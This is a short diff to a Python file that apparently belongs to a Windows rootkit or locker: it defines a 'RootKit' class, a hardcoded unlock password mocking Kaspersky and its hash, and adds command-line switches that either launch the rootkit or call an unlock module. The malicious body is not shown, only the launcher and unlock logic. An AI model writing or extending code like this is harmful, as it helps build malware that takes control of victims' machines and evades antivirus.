@@ -12,6 +12,8 @@ import winreg
 
 from pathlib import Path as PLPath
 
+import unlock
+
 UNLOCK_PASSWORD = "Fuck, you Kaspersky!"
 UNLOCK_HASH = hashlib.sha256(UNLOCK_PASSWORD.encode()).hexdigest()
 
@@ -59,4 +61,13 @@ class RootKit:
 
 
 if __name__ == "__main__":
-    rootkit = RootKit()
+
+    args = sys.argv
+    if len(args) == 1:
+        rootkit = RootKit()
+    if len(args) >= 2:
+        if args[1] == "--unlock":
+            unlock.main_unlocker()
+        if args[1] == "--dbg-unlock" and args[2] == f"--emergency":
+            unlock.unlock_me(None)
+            print("WOW, Kaspersky so smart")
